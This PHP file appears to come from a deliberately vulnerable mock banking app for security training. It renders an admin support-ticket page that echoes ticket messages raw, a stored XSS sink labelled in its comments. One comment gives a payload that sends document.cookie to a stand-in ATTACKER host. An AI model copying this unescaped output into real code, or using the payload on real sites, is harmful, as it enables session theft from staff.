<?php
// ================================================================
//  Union Bank of India – Admin: Support Ticket Management
//  VULNERABLE: XSS TRIGGER – ticket message output WITHOUT htmlspecialchars()
//  Attack Scenario #4: Attacker submits XSS payload via support.php
//  When admin/banker views this page, JS executes, stealing session cookie
// ================================================================
require_once '/var/www/html/config/database.php';
require_once '/var/www/html/includes/auth.php';
$session = check_auth(['admin', 'banker']);

$db = getDB();

// Handle resolve action
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ticket_id'])) {
    $tid = (int)$_POST['ticket_id'];
    $db->prepare("UPDATE support_tickets SET status = 'resolved' WHERE id = ?")->execute([$tid]);
    header('Location: /admin/tickets.php?resolved=1');
    exit;
}

$resolved = isset($_GET['resolved']);
$status_filter = isset($_GET['status']) ? $_GET['status'] : 'all';

$query = "SELECT t.*, u.full_name, u.email, u.phone FROM support_tickets t LEFT JOIN users u ON t.user_id = u.id";
if ($status_filter === 'open') {
    $query .= " WHERE t.status = 'open'";
} elseif ($status_filter === 'resolved') {
    $query .= " WHERE t.status = 'resolved'";
}
$query .= " ORDER BY t.created_at DESC";

$tickets = $db->query($query)->fetchAll();
$open_count     = $db->query("SELECT COUNT(*) FROM support_tickets WHERE status='open'")->fetchColumn();
$resolved_count = $db->query("SELECT COUNT(*) FROM support_tickets WHERE status='resolved'")->fetchColumn();

include '/var/www/html/includes/header.php';
?>
<div class="page-header">
  <div class="container">
    <div>
      <h1>&#128172; Support Ticket Management</h1>
      <div class="breadcrumb"><a href="/admin/index.php">Admin Panel</a> &rsaquo; Support Tickets</div>
    </div>
    <span class="badge role-admin">&#128272; <?= strtoupper(htmlspecialchars($session['role'])) ?></span>
  </div>
</div>

<div class="main-content">
<div class="container">

  <div class="admin-nav">
    <a href="/admin/index.php">Dashboard</a>
    <a href="/admin/users.php">Users</a>
    <a href="/admin/tickets.php" class="active">Support Tickets</a>
    <a href="/dashboard.php">&#8592; Main Dashboard</a>
  </div>

  <?php if ($resolved): ?><div class="alert alert-success">&#9989; Ticket resolved successfully.</div><?php endif; ?>

  <!-- Stats -->
  <div style="display:flex;gap:16px;margin-bottom:20px;flex-wrap:wrap;">
    <div class="stat-card" style="flex:1;min-width:160px;">
      <div class="stat-icon red">&#128172;</div>
      <div><div class="stat-value"><?= $open_count ?></div><div class="stat-label">Open Tickets</div></div>
    </div>
    <div class="stat-card" style="flex:1;min-width:160px;">
      <div class="stat-icon green">&#9989;</div>
      <div><div class="stat-value"><?= $resolved_count ?></div><div class="stat-label">Resolved</div></div>
    </div>
    <div class="stat-card" style="flex:1;min-width:160px;">
      <div class="stat-icon purple">&#128203;</div>
      <div><div class="stat-value"><?= $open_count + $resolved_count ?></div><div class="stat-label">Total</div></div>
    </div>
  </div>

  <!-- Filter -->
  <div style="margin-bottom:16px;display:flex;gap:8px;">
    <a href="/admin/tickets.php" class="btn btn-sm <?= $status_filter==='all'?'btn-primary':'btn-outline' ?>">All</a>
    <a href="/admin/tickets.php?status=open" class="btn btn-sm <?= $status_filter==='open'?'btn-primary':'btn-outline' ?>">Open</a>
    <a href="/admin/tickets.php?status=resolved" class="btn btn-sm <?= $status_filter==='resolved'?'btn-primary':'btn-outline' ?>">Resolved</a>
  </div>

  <!-- Ticket List -->
  <?php if (empty($tickets)): ?>
  <div class="empty-state card" style="padding:40px;">
    <div class="icon">&#128203;</div><p>No tickets found.</p>
  </div>
  <?php endif; ?>

  <?php foreach ($tickets as $tk): ?>
  <div class="card mb-3">
    <div class="ticket-header" style="padding:12px 18px;background:var(--ubi-grey-light);border-bottom:1px solid var(--ubi-border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;">
      <div>
        <strong style="color:var(--ubi-purple);">SR<?= $tk['id'] ?></strong>
        &nbsp;&mdash;&nbsp;
        <strong><?= htmlspecialchars($tk['subject']) ?></strong>
        &nbsp;
        <span class="badge badge-<?= $tk['status']==='open'?'warning':'success' ?>"><?= strtoupper($tk['status']) ?></span>
      </div>
      <div style="font-size:12px;color:var(--ubi-grey);">
        <?= htmlspecialchars($tk['full_name'] ?? $tk['username'] ?? 'Anonymous') ?>
        <?php if ($tk['email']): ?>&nbsp;|&nbsp;<?= htmlspecialchars($tk['email']) ?><?php endif; ?>
        &nbsp;|&nbsp;<?= date('d M Y, h:i A', strtotime($tk['created_at'])) ?>
      </div>
    </div>
    <div class="card-body">
      <div style="line-height:1.75;font-size:13.5px;">
        <!--
          !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
          VULNERABLE: XSS SINK — message echoed RAW without sanitisation
          Stored XSS payload from support.php executes HERE
          Attacker payload: <script>fetch('http://ATTACKER/steal?c='+document.cookie)</script>
          !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        -->
        <?= $tk['message'] ?>
      </div>
      <?php if ($tk['status'] === 'open'): ?>
      <hr class="divider">
      <form method="POST" style="margin:0;">
        <input type="hidden" name="ticket_id" value="<?= $tk['id'] ?>">
        <button type="submit" class="btn btn-success btn-sm">&#9989; Mark Resolved</button>
      </form>
      <?php endif; ?>
    </div>
  </div>
  <?php endforeach; ?>

</div>
</div>
<?php include '/var/www/html/includes/footer.php'; ?>
